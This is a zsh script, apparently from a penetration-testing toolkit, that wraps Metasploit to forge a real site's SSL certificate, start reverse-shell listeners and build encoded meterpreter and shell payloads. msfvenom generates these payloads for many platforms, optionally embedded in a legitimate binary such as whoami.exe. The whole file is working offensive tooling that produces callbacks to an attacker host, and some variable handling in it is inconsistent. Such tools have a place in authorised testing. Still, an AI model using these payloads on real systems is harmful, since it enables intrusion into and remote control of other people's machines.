#!/usr/bin/env zsh

############################################################# 
# nb-shell-handlers-msf
#############################################################
nb-shell-handlers-msf-help() {
    cat << "DOC" | bat --plain --language=help

nb-shell-handlers-msf
---------------------
The shell-handlers-msf namespace provides commands for spawning reverse shell connections using metasploit.

Commands
--------
nb-shell-handlers-msf-install            installs dependencies
nb-shell-handlers-msf-ssl-gen            impersonate a real SSL certificate for use in reverse shells
nb-shell-handlers-msf-w64-https          multi-handler for staged windows/x64/meterpreter/reverse_https payload
nb-shell-handlers-msf-listener           set up metasploit listener
nb-shell-handlers-msf-payload            set up metasploit payload

DOC
}

nb-shell-handlers-msf-install() {
    __info "Running $0..."
    __pkgs metasploit
}

nb-shell-handlers-msf-ssl-gen() {
    __ask "Enter the hostname of the site to impersonate"
    local r && __prefill r SITE aka.ms
    local cmd="use auxiliary/gather/impersonate_ssl; set RHOST ${r}; run; exit "
    __info "Use nb-vars-global-set-ssl-shell-cert to the path of the .pem file"
    print -z "msfconsole -n -q -x \"${cmd}\" "
}

nb-shell-handlers-msf-w64-https() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __msf << VAR
use exploit/multi/handler;
set PAYLOAD windows/x64/meterpreter/reverse_https;
set LHOST ${__LHOST};
set LPORT ${__LPORT};
set HANDLERSSLCERT ${__SHELL_SSL_CERT};
set EXITONSESSION false
run;
exit
VAR

}

nb-shell-handlers-msf-listener() {
    __check-project
    nb-vars-set-lhost
    nb-vars-set-lport

    clear

    echo "Choose a payload type:"
    echo "1.  android/meterpreter/reverse_tcp"
    echo "2.  cmd/windows/reverse_powershell"
    echo "3.  java/jsp_shell_reverse_tcp"
    echo "4.  linux/x64/meterpreter_reverse_https"
    echo "5.  linux/x64/meterpreter_reverse_tcp"
    echo "6.  linux/x64/shell/reverse_tcp"
    echo "7.  osx/x64/meterpreter_reverse_https"
    echo "8.  osx/x64/meterpreter_reverse_tcp"
    echo "9.  php/meterpreter/reverse_tcp"
    echo "10. python/meterpreter_reverse_https"
    echo "11. python/meterpreter_reverse_tcp"
    echo "12. windows/x64/meterpreter_reverse_https"
    echo "13. windows/x64/meterpreter_reverse_tcp"
    echo "14. Previous menu"

    read -p "Enter your choice: " choice
    case $choice in
        1) setup_listener android/meterpreter/reverse_tcp;;
        2) setup_listener cmd/windows/reverse_powershell;;
        3) setup_listener java/jsp_shell_reverse_tcp;;
        4) setup_listener linux/x64/meterpreter_reverse_https;;
        5) setup_listener linux/x64/meterpreter_reverse_tcp;;
        6) setup_listener linux/x64/shell/reverse_tcp;;
        7) setup_listener osx/x64/meterpreter_reverse_https;;
        8) setup_listener osx/x64/meterpreter_reverse_tcp;;
        9) setup_listener php/meterpreter/reverse_tcp;;
        10) setup_listener python/meterpreter_reverse_https;;
        11) setup_listener python/meterpreter_reverse_tcp;;
        12) setup_listener windows/x64/meterpreter_reverse_https;;
        13) setup_listener windows/x64/meterpreter_reverse_tcp;;
        14) exit;;
        *) echo "Invalid option";;
    esac
    


    #echo
    #echo -n "LHOST: "
    #read lhost
    
    # Check for no answer
    #if [ -z $lhost ]; then
    #     lhost=$ip
    #     echo "[*] Using $ip"
    #     echo
    #fi
    
    #echo -n "LPORT: "
    #read lport
    
    # Check for no answer
    #if [ -z ${__LPORT} ]; then
    #     lport=443
    #     echo "[*] Using 443"
    #fi
    


    # Check for root when binding to a low port
    #if [[ ${__LPORT} -lt 1025 && "$(id -u)" != "0" ]]; then
    #     echo "You must be root to bind to a port that low."
    #     sleep 3
    #     f_error
    #fi
    
    cp $discover/resource/listener.rc /tmp/
    
    sed -i "s|aaa|$payload|g" /tmp/listener.rc
    sed -i "s/bbb/$lhost/g" /tmp/listener.rc
    sed -i "s/ccc/${__LPORT}/g" /tmp/listener.rc
    
    echo
    msfconsole -q -r /tmp/listener.rc
}

nb-shell-handlers-msf-payload() {
    __check-project
    nb-vars-set-lhost
    nb-vars-set-lport

    clear
    f_banner
    
    f_format(){
    echo
    echo -e "${BLUE}Formats${NC}"
    echo
    echo '1. aspx'
    echo '2. c'
    echo '3. csharp'
    echo '4. exe'
    echo '5. psh'
    echo '6. raw'
    echo
    echo -n "Choice: "
    read choice2
    
    case $choice2 in
         1) extention=".aspx"
              format="aspx";;
         2) extention=".c"
              format="c";;
         3) extention=".cs"
              format="csharp";;
         4) extention=".exe"
              format="exe";;
         5) extention=".ps1"
              format="psh";;
         6) extention=".bin"
              format="raw";;
         *) f_error;;
    esac
    }
    
    echo -e "${BLUE}Malicious Payloads${NC}"
    echo
    echo "1.   android/meterpreter/reverse_tcp         (.apk)"
    echo "2.   cmd/windows/reverse_powershell          (.bat)"
    echo "3.   java/jsp_shell_reverse_tcp (Linux)      (.jsp)"
    echo "4.   java/jsp_shell_reverse_tcp (Windows)    (.jsp)"
    echo "5.   java/shell_reverse_tcp                  (.war)"
    echo "6.   linux/x64/meterpreter_reverse_https     (.elf)"
    echo "7.   linux/x64/meterpreter_reverse_tcp       (.elf)"
    echo "8.   linux/x64/shell/reverse_tcp             (.elf)"
    echo "9.   osx/x64/meterpreter_reverse_https       (.macho)"
    echo "10.  osx/x64/meterpreter_reverse_tcp         (.macho)"
    echo "11.  php/meterpreter_reverse_tcp             (.php)"
    echo "12.  python/meterpreter_reverse_https        (.py)"
    echo "13.  python/meterpreter_reverse_tcp          (.py)"
    echo "14.  windows/x64/meterpreter_reverse_https   (multi)"
    echo "15.  windows/x64/meterpreter_reverse_tcp     (multi)"
    echo "16.  Previous menu"
    
    echo
    echo -n "Choice: "
    read choice
    
    case $choice in
         1) payload="android/meterpreter/reverse_tcp"
              extention=".apk"
              format="raw"
              arch="dalvik"
              platform="android";;
         2) payload="cmd/windows/reverse_powershell"
              extention=".bat"
              format="raw"
              arch="cmd"
              platform="windows";;
         3) payload="java/jsp_shell_reverse_tcp"
              extention=".jsp"
              format="raw"
              arch="elf"
              platform="linux";;
         4) payload="java/jsp_shell_reverse_tcp"
              extention=".jsp"
              format="raw"
              arch="cmd"
              platform="windows";;
         5) payload="java/shell_reverse_tcp"
              extention=".war"
              format="war"
              arch="x64"
              platform="linux";;
         6) payload="linux/x64/meterpreter_reverse_https"
              extention=".elf"
              format="elf"
              arch="x64"
              platform="linux";;
         7) payload="linux/x64/meterpreter_reverse_tcp"
              extention=".elf"
              format="elf"
              arch="x64"
              platform="linux";;
         8) payload="linux/x64/shell/reverse_tcp"
              extention=".elf"
              format="elf"
              arch="x64"
              platform="linux";;
         9) payload="osx/x64/meterpreter_reverse_https"
              extention=".macho"
              format="macho"
              arch="x64"
              platform="osx";;
         10) payload="osx/x64/meterpreter_reverse_tcp"
              extention=".macho"
              format="macho"
              arch="x64"
              platform="osx";;
         11) payload="php/meterpreter_reverse_tcp"
              extention=".php"
              format="raw"
              arch="php"
              platform="php"
              encoder="php/base64";;
         12) payload="python/meterpreter_reverse_https"
              extention=".py"
              format="raw"
              arch="python"
              platform="python";;
         13) payload="python/meterpreter_reverse_tcp"
              extention=".py"
              format="raw"
              arch="python"
              platform="python";;
         14) payload="windows/x64/meterpreter_reverse_https"
              arch="x64"
              platform="windows"
              f_format;;
         15) payload="windows/x64/meterpreter_reverse_tcp"
              arch="x64"
              platform="windows"
              f_format;;
         16) f_main;;
    
         *) f_error;;
    esac
    
    echo
    echo -n "LHOST: "
    read lhost
    
    # Check for no answer
    if [ -z $lhost ]; then
         lhost=$ip
         echo "[*] Using $ip"
         echo
    fi
    
    echo -n "LPORT: "
    read lport
    
    # Check for no answer.
    if [ -z $lport ]; then
         lport=443
         echo "[*] Using 443"
         echo
    fi
    
    # Check for valid port number.
    if [[ ${__LPORT} -lt 1 || ${__LPORT} -gt 65535 ]]; then
         f_error
    fi
    
    echo -n "Iterations: "
    read iterations
    
    # Check for no answer.
    if [ -z $iterations ]; then
         iterations=1
         echo "[*] Using 1"
    fi
    
    # Check for valid number that is reasonable.
    if [[ $iterations -lt 0 || $iterations -gt 20 ]]; then
         f_error
    fi
    
    x=$(echo $payload | sed 's/\//-/g')
    
    echo
    echo -n "Use a template file? (y/N) "
    read answer
    
    if [ "$answer" == "y" ]; then
         echo -n "Enter the path to the file (default whoami.exe): "
         read template
    
         if [ -z $template ]; then
              template=/usr/share/windows-resources/binaries/whoami.exe
              echo '[*] Using /usr/share/windows-resources/binaries/whoami.exe'
         fi
    
         if [ ! -f $template ]; then
              f_error
         fi
    
         echo
         msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -x $template -e x64/xor_dynamic -i $iterations -o $home/data/$x-${__LPORT}-$iterations$extention
    else
         echo
         msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -e x64/xor_dynamic -i $iterations -o $home/data/$x-${__LPORT}-$iterations$extention
    fi
}
